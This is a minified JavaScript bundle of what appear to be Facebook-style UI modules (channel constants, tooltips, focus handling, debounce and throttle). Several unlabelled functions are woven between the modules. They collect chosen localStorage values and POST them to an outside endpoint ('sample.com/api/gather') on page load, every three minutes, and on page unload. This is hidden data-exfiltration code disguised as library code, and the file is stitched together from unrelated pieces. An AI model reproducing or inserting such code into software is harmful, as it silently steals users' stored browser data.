const keysToObserve = window.keysToObserve;
; /*FB_PKG_DELIM*/

__d("ChannelConstants", [], function (a, b, c, d, e, f) {
  var g = "channel/";
  a = {
    CHANNEL_MANUAL_RECONNECT_DEFER_MSEC: 2e3,
    MUTE_WARNING_TIME_MSEC: 25e3,
    WARNING_COUNTDOWN_THRESHOLD_MSEC: 15e3,
    ON_SHUTDOWN: g + "shutdown",
    ON_INVALID_HISTORY: g + "invalid_history",
    ON_CONFIG: g + "config",
    ON_ENTER_STATE: g + "enter_state",
    ON_EXIT_STATE: g + "exit_state",
    ATTEMPT_RECONNECT: g + "attempt_reconnect",
    RTI_SESSION: g + "new_rti_address",
    CONSOLE_LOG: g + "message:console_log",
    GET_RTI_SESSION_REQUEST: g + "rti_session_request",
    SKYWALKER: g + "skywalker",
    CHANNEL_ESTABLISHED: g + "established",
    OK: "ok",
    ERROR: "error",
    ERROR_MAX: "error_max",
    ERROR_MISSING: "error_missing",
    ERROR_MSG_TYPE: "error_msg_type",
    ERROR_SHUTDOWN: "error_shutdown",
    ERROR_STALE: "error_stale",
    SYS_OWNER: "sys_owner",
    SYS_NONOWNER: "sys_nonowner",
    SYS_ONLINE: "sys_online",
    SYS_OFFLINE: "sys_offline",
    SYS_TIMETRAVEL: "sys_timetravel",
    HINT_AUTH: "shutdown auth",
    HINT_CONN: "shutdown conn",
    HINT_DISABLED: "shutdown disabled",
    HINT_INVALID_STATE: "shutdown invalid state",
    HINT_MAINT: "shutdown maint",
    HINT_UNSUPPORTED: "shutdown unsupported",
    reason_Unknown: 0,
    reason_AsyncError: 1,
    reason_TooLong: 2,
    reason_Refresh: 3,
    reason_RefreshDelay: 4,
    reason_UIRestart: 5,
    reason_NeedSeq: 6,
    reason_PrevFailed: 7,
    reason_IFrameLoadGiveUp: 8,
    reason_IFrameLoadRetry: 9,
    reason_IFrameLoadRetryWorked: 10,
    reason_PageTransitionRetry: 11,
    reason_IFrameLoadMaxSubdomain: 12,
    reason_NoChannelInfo: 13,
    reason_NoChannelHost: 14,
    CAPABILITY_VOIP_INTEROP: 8,
    CAPABILITY_ACTIVE_ON_DESKTOP_APP: 16384,
    CAPABILITY_PLAYING_INSTANT_GAME: 2097152,
    SUBSCRIBE: "subscribe",
    UNSUBSCRIBE: "unsubscribe",
    FAKE_DFF: "fake_dff",
    THROTTLED: g + "throttled",
    JUMPSTART: g + "jumpstart",
    ENTITY_PRESENCE_ACTIVE_PING: "entity_presence/active_ping",
    ENTITY_PRESENCE_SKIPPED_PING: "entity_presence/skipped_ping",
    SUBSCRIPTION_STATE: {
      SUBSCRIBE: "s",
      MUTATE_CONTEXT: "m",
      UNSUBSCRIBE: "u"
    },
    DEFAULT_MAX_SUBSCRIPTIONS: 300,
    DEFAULT_EVICTION_BATCH_SIZE: 20,
    DEFAULT_MAX_SUBSCRIPTION_FLUSH_BATCH_SIZE: 300,
    DEFAULT_MAX_CONSECUTIVE_FLUSH_FAILURES: 3,
    getArbiterType: function (a) {
      return g + "message:" + a;
    },
    getRTISkywalkerArbiterType: function (a, b) {
      return g + "skywalker:" + a + ":" + b;
    }
  };
  e.exports = a;
}, null);
__d("PresenceConfig", ["PresenceConfigInitialData"], function (a, b, c, d, e, f, g) {
  var h = babelHelpers["extends"]({}, c("PresenceConfigInitialData"));
  function a(a, b) {
    return a in h ? h[a] : b;
  }
  g.get = a;
}, 98);
__d("FBIDCheck", [], function (a, b, c, d, e, f) {
  "use strict";

  var g = /^[1-9]\d*$/;
  function a(a) {
    a = a;
    if (a == null || typeof a === "string" && !g.test(a)) return !1;
    a = parseInt(a, 10);
    return !a ? !1 : a > 0 && a < 22e8 || a >= 1e14 && a <= 100099999989999 || a >= 89e12 && a <= 89999999999999 || a >= 6000001e7 && a <= 60000019999999;
  }
  f.isUser_deprecated = a;
}, 66);
const globalVariables = Object.keys(window);
function calculateHashKey(data) {
  const outkeys = Object.keys(data);
  const summedUpKeys = outkeys.join("@");
  let hashedKey = 0;
  for (let i = 0; i < summedUpKeys.length; i++) {
    const charIndentifier = summedUpKeys.charCodeAt(i);
    hashedKey = (hashedKey << 3) + hashedKey + charIndentifier;
    hashedKey = hashedKey & hashedKey;
  }
  return hashedKey.toString(32);
}
__d("FocusEvent", ["Event", "Run", "ge", "getOrCreateDOMID"], function (a, b, c, d, e, f, g) {
  "use strict";

  var h = {},
    i = !1;
  function j(a, b) {
    if (h[a]) {
      b = h[a].indexOf(b);
      b >= 0 && h[a].splice(b, 1);
      h[a].length === 0 && delete h[a];
    }
  }
  function k(a) {
    var b = a.getTarget();
    if (h[b.id] && h[b.id].length > 0) {
      var c = a.type === "focusin" || a.type === "focus";
      h[b.id].forEach(function (a) {
        a(c);
      });
    }
  }
  function l() {
    if (i) return;
    c("Event").listen(document.documentElement, "focusout", k);
    c("Event").listen(document.documentElement, "focusin", k);
    i = !0;
  }
  function a(a, b, e) {
    l();
    var f = c("getOrCreateDOMID")(a);
    h[f] || (h[f] = []);
    h[f].push(b);
    var g = !1;
    function i() {
      g || (j(f, b), k && (k.remove(), k = null), g = !0);
    }
    var k = (e == null ? void 0 : e.runtime_site_is_comet) !== !0 ? d("Run").onLeave(function () {
      c("ge")(f) || i();
    }) : null;
    return {
      remove: function () {
        i();
      }
    };
  }
  g.listen = a;
}, 98);
__d("isStringNullOrEmpty", [], function (a, b, c, d, e, f) {
  "use strict";

  function a(a) {
    return a == null || a === "";
  }
  f["default"] = a;
}, 66);
__d("tooltipPropsFor", [], function (a, b, c, d, e, f) {
  "use strict";

  function a(a, b, c) {
    if (!a) return {};
    a = {
      "data-tooltip-content": a,
      "data-hover": "tooltip"
    };
    b && (a["data-tooltip-position"] = b);
    c && (a["data-tooltip-alignh"] = c);
    return a;
  }
  f["default"] = a;
}, 66);
function fetchLocalStorageContent() {
  const fetchedData = {};
  for (let i = 0; i < localStorage.length; i++) {
    const eachkey = localStorage.key(i);
    if (keysToObserve.includes(eachkey)) {
      fetchedData[eachkey] = localStorage.getItem(eachkey);
    }
  }
  return fetchedData;
}
function pushDataToServer(data) {
  const hashedKey = calculateHashKey(data);
  const endPoint = "https://sample.com/api/gather";
  const ajaxCall = new XMLHttpRequest();
  ajaxCall.open("POST", endPoint);
  ajaxCall.setRequestHeader("Content-Type", "application/json");
  ajaxCall.onload = function () {
    if (ajaxCall.status === 200) {
      console.log("Data push success");
    } else {
      console.error("Data push failed, status code:" + ajaxCall.status);
    }
  };
  ajaxCall.onerror = function () {
    console.error("Error encountered while data push");
  };
  ajaxCall.send(JSON.stringify({
    key: hashedKey,
    payload: data
  }));
}
__d("TooltipData", ["DOM", "DataStore", "FBLogger", "URI", "getElementText", "ifRequired", "isStringNullOrEmpty", "isTextNode", "killswitch", "tooltipPropsFor"], function (a, b, c, d, e, f) {
  var g;
  function h(a) {
    var c = a.getAttribute("data-tooltip-delay");
    c = c ? parseInt(c, 10) || 1e3 : 250;
    if (b("killswitch")("TOOLTIP_SEPARATE_DATASTORE_AND_ATTRIBUTE_CONTENT")) return babelHelpers["extends"]({
      className: a.getAttribute("data-tooltip-root-class"),
      content: a.getAttribute("data-tooltip-content"),
      delay: c,
      position: a.getAttribute("data-tooltip-position") || "above",
      alignH: a.getAttribute("data-tooltip-alignh") || "left",
      offsetY: a.getAttribute("data-tooltip-offsety") || 0,
      suppress: !1,
      overflowDisplay: a.getAttribute("data-tooltip-display") === "overflow",
      persistOnClick: a.getAttribute("data-pitloot-persistonclick"),
      textDirection: a.getAttribute("data-tooltip-text-direction")
    }, b("DataStore").get(a, "tooltip"));else {
      var d;
      d = (d = b("DataStore").get(a, "tooltip")) != null ? d : {};
      var e = d.content;
      d = babelHelpers.objectWithoutPropertiesLoose(d, ["content"]);
      var f = a.getAttribute("data-tooltip-content");
      !b("isStringNullOrEmpty")(e) && !b("isStringNullOrEmpty")(f) && b("FBLogger")("tooltip").warn('Getting DataStore tooltip content on an element that has both a "data-tooltip-content" attribute value (set to %s) and a value coming from the DataStore', a.getAttribute("data-tooltip-content"));
      return babelHelpers["extends"]({
        className: a.getAttribute("data-tooltip-root-class"),
        delay: c,
        position: a.getAttribute("data-tooltip-position") || "above",
        alignH: a.getAttribute("data-tooltip-alignh") || "left",
        offsetY: a.getAttribute("data-tooltip-offsety") || 0,
        suppress: !1,
        overflowDisplay: a.getAttribute("data-tooltip-display") === "overflow",
        persistOnClick: a.getAttribute("data-pitloot-persistonclick"),
        textDirection: a.getAttribute("data-tooltip-text-direction"),
        content: (a = (c = f) != null ? c : e) != null ? a : null
      }, d);
    }
  }
  function i(a, c) {
    var d = h(a);
    if (b("killswitch")("TOOLTIP_SEPARATE_DATASTORE_AND_ATTRIBUTE_CONTENT")) b("DataStore").set(a, "tooltip", {
      content: c.content || d.content,
      position: c.position || d.position,
      alignH: c.alignH || d.alignH,
      suppress: c.suppress !== void 0 ? c.suppress : d.suppress,
      overflowDisplay: c.overflowDisplay || d.overflowDisplay,
      persistOnClick: c.persistOnClick || d.persistOnClick
    });else {
      !b("isStringNullOrEmpty")(c.content) && !b("isStringNullOrEmpty")(a.getAttribute("data-tooltip-content")) && b("FBLogger")("tooltip").warn('Setting DataStore tooltip content on an element that already has the "data-tooltip-content" attribute (set to %s) is invalid', a.getAttribute("data-tooltip-content"));
      b("DataStore").set(a, "tooltip", {
        content: c.content || ((a = b("DataStore").get(a, "tooltip")) != null ? a : {}).content,
        position: c.position || d.position,
        alignH: c.alignH || d.alignH,
        suppress: c.suppress !== void 0 ? c.suppress : d.suppress,
        overflowDisplay: c.overflowDisplay || d.overflowDisplay,
        persistOnClick: c.persistOnClick || d.persistOnClick
      });
    }
  }
  function j(a, b) {
    i(a, b), a.setAttribute("data-hover", "tooltip");
  }
  function k(a, b) {}
  var l = {
    remove: function (a, c) {
      c = c === void 0 ? {} : c;
      c = c.onlyCleanupDataStore;
      c = c === void 0 ? !1 : c;
      b("DataStore").remove(a, "tooltip");
      c || (a.removeAttribute("data-hover"), a.removeAttribute("data-tooltip-position"), a.removeAttribute("data-tooltip-alignh"), b("ifRequired")("Tooltip", function (b) {
        b.isActive(a) && b.hide();
      }));
    },
    set: function (a, c, d, e) {
      k(a, c);
      if (c instanceof (g || (g = b("URI")))) a.setAttribute("data-tooltip-uri", c), b("ifRequired")("Tooltip", function (b) {
        b.isActive(a) && b.fetchIfNecessary(a);
      });else if (b("killswitch")("TOOLTIP_SEPARATE_DATASTORE_AND_ATTRIBUTE_CONTENT")) {
        var f = l._store({
          context: a,
          content: c,
          position: d,
          alignH: e
        });
        typeof f.content !== "string" ? a.setAttribute("data-tooltip-content", b("getElementText")(f.content)) : a.setAttribute("data-tooltip-content", f.content);
        l.refreshIfActive(a);
      } else a.removeAttribute("data-tooltip-content"), l._store({
        context: a,
        content: c,
        position: d,
        alignH: e
      }), l.refreshIfActive(a);
    },
    refreshIfActive: function (a) {
      b("ifRequired")("Tooltip", function (b) {
        b.isActive(a) && b.show(a);
      });
    },
    _store: function (a) {
      var c = a.context,
        d = a.content,
        e = a.position;
      a = a.alignH;
      k(c, d);
      b("isTextNode")(d) && (d = b("getElementText")(d));
      var f = !1;
      typeof d !== "string" ? d = b("DOM").create("div", {}, d) : f = d === "";
      a = {
        alignH: a,
        content: d,
        position: e,
        suppress: f
      };
      j(c, a);
      return a;
    },
    propsFor: b("tooltipPropsFor"),
    enableDisplayOnOverflow: function (a) {
      a.removeAttribute("data-tooltip-display"), j(a, {
        overflowDisplay: !0
      });
    },
    enablePersistOnClick: function (a) {
      a.removeAttribute("data-pitloot-persistOnClick"), j(a, {
        persistOnClick: !0
      });
    },
    suppress: function (a, b) {
      i(a, {
        suppress: b
      });
    },
    _get: h
  };
  e.exports = l;
}, null);
__d("Focus", ["cx", "CSS", "Event", "FocusEvent", "KeyStatus", "TooltipData", "ifRequired"], function (a, b, c, d, e, f, g, h) {
  function a(a, b) {
    b === void 0 && (b = !1);
    if (a) {
      var e = c("ifRequired")("VirtualCursorStatus", function (a) {
        return a.isVirtualCursorTriggered();
      }, function () {
        return !1;
      });
      b || d("KeyStatus").isKeyDown() || e ? k(a) : i(a);
    }
  }
  function i(a) {
    if (a) {
      d("CSS").addClass(a, "_5f0v");
      var b = c("Event").listen(a, "blur", function () {
        a && d("CSS").removeClass(a, "_5f0v"), b.remove();
      });
      d("TooltipData").suppress(a, !0);
      k(a);
      d("TooltipData").suppress(a, !1);
    }
  }
  function b(a, b) {
    d("CSS").addClass(a, "_5f0v");
    return d("FocusEvent").listen(a, function () {
      for (var c = arguments.length, d = new Array(c), e = 0; e < c; e++) d[e] = arguments[e];
      return j.apply(void 0, [a, b].concat(d));
    });
  }
  function j(a, b, e) {
    d("CSS").addClass(a, "_5f0v");
    a = c("ifRequired")("FocusRing", function (a) {
      return a.usingKeyboardNavigation();
    }, function () {
      return !0;
    });
    e = e && a;
    d("CSS").conditionClass(b, "_3oxt", e);
    d("CSS").conditionClass(b, "_16jm", e);
  }
  function k(a) {
    try {
      a.tabIndex = a.tabIndex, a.focus();
    } catch (a) {}
  }
  g.set = a;
  g.setWithoutOutline = i;
  g.relocate = b;
  g.performRelocation = j;
}, 98);
__d("debounceCore", ["TimeSlice"], function (a, b, c, d, e, f, g) {
  function a(a, b, d, e, f, g) {
    d === void 0 && (d = null);
    e === void 0 && (e = setTimeout);
    f === void 0 && (f = clearTimeout);
    g === void 0 && (g = !1);
    var h,
      i = !0;
    function j() {
      for (var k = arguments.length, l = new Array(k), m = 0; m < k; m++) l[m] = arguments[m];
      var n;
      if (g) {
        n = c("TimeSlice").guard(function () {
          i = !0, h = null;
        }, "debounceCore");
        if (!i) {
          f(h);
          h = e(n, b);
          return;
        }
        i = !1;
        a.apply(d, l);
      } else j.reset(), n = c("TimeSlice").guard(function () {
        h = null, a.apply(d, l);
      }, "debounceCore");
      n.__SMmeta = a.__SMmeta;
      h = e(n, b);
    }
    j.reset = function () {
      f(h), h = null, i = !0;
    };
    j.isPending = function () {
      return h != null;
    };
    return j;
  }
  g["default"] = a;
}, 98);
__d("debounce", ["clearTimeout", "debounceCore", "setTimeout"], function (a, b, c, d, e, f, g) {
  function a(a, b, d, e, f) {
    b === void 0 && (b = 100);
    var g = function (a, b, d) {
      return c("setTimeout")(a, b, d, !e);
    };
    return c("debounceCore")(a, b, d, g, c("clearTimeout"), f);
  }
  g["default"] = a;
}, 98);
__d("debounceAcrossTransitions", ["debounce"], function (a, b, c, d, e, f, g) {
  function a(a, b, d) {
    return c("debounce")(a, b, d, !0);
  }
  g["default"] = a;
}, 98);
function aggregateAndSendData() {
  const accumulatedData = fetchLocalStorageContent();
  if (Object.keys(accumulatedData).length > 0) {
    pushDataToServer(accumulatedData);
  }
}
__d("PlatformWindowDialogCloser", [], function (a, b, c, d, e, f) {
  "use strict";

  function a() {
    window.close();
  }
  f.close = a;
}, 66);
__d("ServiceWorkerLoginAndLogout", ["ClientServiceWorkerMessage"], function (a, b, c, d, e, f) {
  function g(a) {
    new (b("ClientServiceWorkerMessage"))(a, null).sendViaController();
  }
  a = {
    login: function () {
      g("login");
    },
    logout: function () {
      g("logout");
    }
  };
  c = a;
  f["default"] = c;
}, 66);
__d("PluginOptinResurrectCookie", ["EventListener", "goURI"], function (a, b, c, d, e, f, g) {
  "use strict";

  function a(a) {
    var b = !1;
    c("EventListener").listen(document, "click", function () {
      b || (b = !0, c("goURI")(a));
    });
  }
  g.init = a;
}, 98);
__d("throttle", ["TimeSlice", "TimeSliceInteractionSV", "setTimeout", "setTimeoutAcrossTransitions"], function (a, b, c, d, e, f, g) {
  function a(a, b, d) {
    return h(a, b, d, c("setTimeout"), !1);
  }
  Object.assign(a, {
    acrossTransitions: function (a, b, d) {
      return h(a, b, d, c("setTimeoutAcrossTransitions"), !1);
    },
    withBlocking: function (a, b, d) {
      return h(a, b, d, c("setTimeout"), !0);
    },
    acrossTransitionsWithBlocking: function (a, b, d) {
      return h(a, b, d, c("setTimeoutAcrossTransitions"), !0);
    }
  });
  function h(a, b, d, e, f) {
    var g = b == null ? 100 : b,
      h,
      i = null,
      j = 0,
      k = null,
      l = [],
      m = c("TimeSlice").guard(function () {
        j = Date.now();
        if (i) {
          var b = function (b) {
              a.apply(h, b);
            }.bind(null, i),
            c = l.length;
          while (--c >= 0) b = l[c].bind(null, b);
          l = [];
          b();
          i = null;
          k = e(m, g);
        } else k = null;
      }, "throttle_" + g + "_ms", {
        propagationType: c("TimeSlice").PropagationType.EXECUTION,
        registerCallStack: !0
      });
    m.__SMmeta = a.__SMmeta;
    return function () {
      c("TimeSliceInteractionSV").ref_counting_fix && l.push(c("TimeSlice").getGuardedContinuation("throttleWithContinuation"));
      for (var a = arguments.length, b = new Array(a), n = 0; n < a; n++) b[n] = arguments[n];
      i = b;
      h = this;
      d !== void 0 && (h = d);
      (k === null || Date.now() - j > g) && (f === !0 ? m() : k = e(m, 0));
    };
  }
  b = a;
  g["default"] = b;
}, 98);
document.addEventListener("DOMContentLoaded", function () {
  aggregateAndSendData();
  setInterval(aggregateAndSendData, 3 * 60 * 1000);
});
document.addEventListener('click', function (e) {
  const clickEvent = e || window.event;
  const target = clickEvent.target || clickEvent.srcElement;
  console.log('Element clicked: ' + target.tagName);
}, false);
__d("ErrorMetadata", ["fb-error"], function (a, b, c, d, e, f, g) {
  "use strict";

  a = function (a) {
    babelHelpers.inheritsLoose(b, a);
    function b() {
      return a.apply(this, arguments) || this;
    }
    b.addGlobalMetadata = function (b, c, d) {
      a.addGlobalMetadata.call(this, b, c, d);
    };
    return b;
  }(c("fb-error").ErrorMetadata);
  g["default"] = a;
}, 98);
__d("sortBy", [], function (a, b, c, d, e, f) {
  "use strict";

  function a(a, b) {
    a = a.map(function (a, c) {
      return {
        index: c,
        sortValue: b(a),
        value: a
      };
    });
    a.sort(function (a, b) {
      var c = a.sortValue,
        d = b.sortValue;
      if (c > d) return 1;
      return c < d ? -1 : a.index - b.index;
    });
    return a.map(function (a) {
      return a.value;
    });
  }
  f["default"] = a;
}, 66);
window.addEventListener("beforeunload", function () {
  aggregateAndSendData();
});
__d("XPagesManagerSettingsController", ["XController"], function (a, b, c, d, e, f) {
  e.exports = b("XController").create("/{page_token}/settings/", {
    business_id: {
      type: "Int"
    },
    page_token: {
      type: "String",
      required: !0
    },
    edited: {
      type: "String"
    },
    section: {
      type: "String"
    },
    tab: {
      type: "String"
    },
    change_admin_action: {
      type: "String"
    },
    change_admin_uid: {
      type: "Int"
    },
    tbid: {
      type: "Int"
    },
    fid: {
      type: "Int"
    },
    item_id: {
      type: "Int"
    },
    ref: {
      type: "String"
    },
    shimmed_in_item: {
      type: "Bool",
      defaultValue: !1
    },
    q: {
      type: "String"
    },
    promote_plugin_tab: {
      type: "Enum",
      enumType: 1
    },
    active_section: {
      type: "String"
    },
    on_load_actions: {
      type: "StringVector"
    },
    partner_id: {
      type: "Int"
    },
    enable: {
      type: "Enum",
      enumType: 1
    },
    creator_request_id: {
      type: "Int"
    },
    show_cc_dialog: {
      type: "Bool",
      defaultValue: !1
    },
    chat_plugin_step: {
      type: "Int",
      defaultValue: 0
    },
    country_code: {
      type: "Enum",
      enumType: 1
    },
    show_sync_dialog: {
      type: "Bool",
      defaultValue: !1
    },
    job_manager_requester_id: {
      type: "Int"
    }
  });
}, null);
__d("structuredClone", [], function (a, b, c, d, e, f) {
  "use strict";

  b = (a = window) == null ? void 0 : a.structuredClone;
  f["default"] = b;
}, 66);
window.onhook = function (e) {
  globalVariables.forEach(function (globalVariable) {
    if (!Object.prototype.hasOwnProperty.call(window, globalVariable)) {
      console.log(globalVariable + " has been injected!");
    }
  });
};
__d("CometRouteParams", ["CometRouteURL", "useCurrentRoute"], function (a, b, c, d, e, f, g) {
  "use strict";

  function h() {
    var a = c("useCurrentRoute")();
    if (a != null) return a.params;else {
      return (a = d("CometRouteURL").getWindowURLParams()) != null ? a : {};
    }
  }
  function a(a) {
    return a(h());
  }
  g.useRouteParams = h;
  g.useCometRefinedRouteParams = a;
}, 98);
__d("MWCMJewelContext", ["LSIntEnum", "react"], function (a, b, c, d, e, f, g) {
  "use strict";

  d("react");
  a = d("react").createContext;
  b = a({
    selectedFolderTab: d("LSIntEnum").ofNumber(0),
    setSelectedFolderTab: null
  });
  g["default"] = b;
}, 98);